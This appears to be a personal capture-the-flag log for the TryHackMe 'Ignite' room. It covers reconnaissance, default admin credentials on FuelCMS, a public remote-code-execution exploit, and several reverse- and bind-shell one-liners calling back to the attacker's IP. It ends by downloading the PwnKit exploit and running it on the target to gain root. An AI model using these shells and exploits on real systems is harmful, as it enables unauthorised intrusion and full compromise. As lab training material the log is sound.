# https://tryhackme.com/room/ignite

```bash
=================================
10.201.52.194 -- domain.com -- lin x32/x64
=================================

2025-08-13 16:03:30 -- sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan 10.201.52.194
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped

2025-08-13 16:04:49 -- curl -o- http://10.201.52.194/
// response & browsed
// default config so admin panel accessible
// FuelCMS v1.4

2025-08-13 16:07:36 -- http://10.201.52.194/fuel/dashboard
// admin:admin

2025-08-13 16:15:33 -- curl -I http://10.201.52.194/
HTTP/1.1 200 OK
Date: Wed, 13 Aug 2025 20:15:26 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Type: text/html; charset=UTF-8

2025-08-13 16:16:56 -- sudo nmap -sS -sV -p 80 10.201.52.194
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

2025-08-13 16:20:54 -- gobuster dir --output gobuster --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.201.52.194
/index                (Status: 200) [Size: 16597]
/home                 (Status: 200) [Size: 16597]
/0                    (Status: 200) [Size: 16597]
/assets               (Status: 301) [Size: 315] [--> http://10.201.52.194/assets/]                                                                      
/'                    (Status: 400) [Size: 1134]
/$FILE                (Status: 400) [Size: 1134]
/$file                (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/*checkout*           (Status: 400) [Size: 1134]
/*docroot*            (Status: 400) [Size: 1134]
/*                    (Status: 400) [Size: 1134]
/$File                (Status: 400) [Size: 1134]
/!ut                  (Status: 400) [Size: 1134]
/search!default       (Status: 400) [Size: 1134]
/msgReader$1          (Status: 400) [Size: 1134]
/guestsettings!default (Status: 400) [Size: 1134]
/login!withRedirect   (Status: 400) [Size: 1134]
/$1                   (Status: 400) [Size: 1134]
/fuel                 (Status: 301) [Size: 313] [--> http://10.201.52.194/fuel/]                                                                        
/front_page!PAGETYPE  (Status: 400) [Size: 1134]
/**http%3a            (Status: 400) [Size: 1134]
/searchProfile!input  (Status: 400) [Size: 1134]
/Who's-Connecting     (Status: 400) [Size: 1134]
/*http%3A             (Status: 400) [Size: 1134]
/$VisitURL            (Status: 400) [Size: 1134]
/escalate!PAGETYPE    (Status: 400) [Size: 1134]

searchsploit --verbose --update
2025-08-13 16:31:59 -- searchsploit fuel cms
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1 | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2 | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3 | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injecti | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Aut | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL In | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forge | php/webapps/50884.txt
------------------------------------------ ---------------------------------

cp -v /usr/share/webshells/php/php-reverse-shell.php /tmp/tacos.phtml
$ip = '192.168.121.246';  // CHANGE THIS
$port = 54321;       // CHANGE THIS
2025-08-13 16:39:20 -- There was an error uploading your file. Please make sure the server is setup to upload files of this size and folders are writable.
// cant upload files
    
nc -lvnp 54321
curl http://10.201.52.194/offline
// not working

Please make sure the server is setup to upload files of this size and folders are writable

!!! BOX DIED SO NEW IP !!!
10.201.88.132
https://www.exploit-db.com/raw/47138
// remove proxy line and variable from r.get()
2025-08-13 17:24:37 -- python2 47138.py
// works if a bit messy!

// ME ** USE tun0 IP ADDR!! **
// 10.2.0.82
nc -lvnp 54321
ping -c1 -W 5 192.168.121.246
// no
ping -c1 -W 5 192.168.121.245
/ no
ping -c1 -W 5 10.2.0.82
// yes! 64 bytes from 10.2.0.82: icmp_seq=1 ttl=60 time=135 ms

sudo nc -lvnp 443

# --- DIDNT WORK ---
# URL ENCODE
echo '<COMMAND>' | python3 -c 'import urllib.parse, sys; print("\n"+urllib.parse.quote(sys.stdin.read()))'

bash -i >& /dev/tcp/10.2.0.82/54321 0>&1
nc -e /bin/bash 10.2.0.82 54321
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.2.0.82 54321 > /tmp/f
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.0.82",54321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.0.82",54321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
# ---

netstat -antp

# TARGET    
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 54321 > /tmp/f
# CONNECT
nc -nv 10.201.88.132 54321

python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ ls -la /home/www-data/flag.txt    
ls -la /home/www-data/flag.txt

# fix escape codes mess in terminal
CTRL + Z
stty raw -echo; fg

// STICKY
https://github.com/ly4k/PwnKit
cd /tmp
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
python3 -m http.server 8000

wget http://10.2.0.82:8000/PwnKit
chmod +x PwnKit
./PwnKit
// got root!
```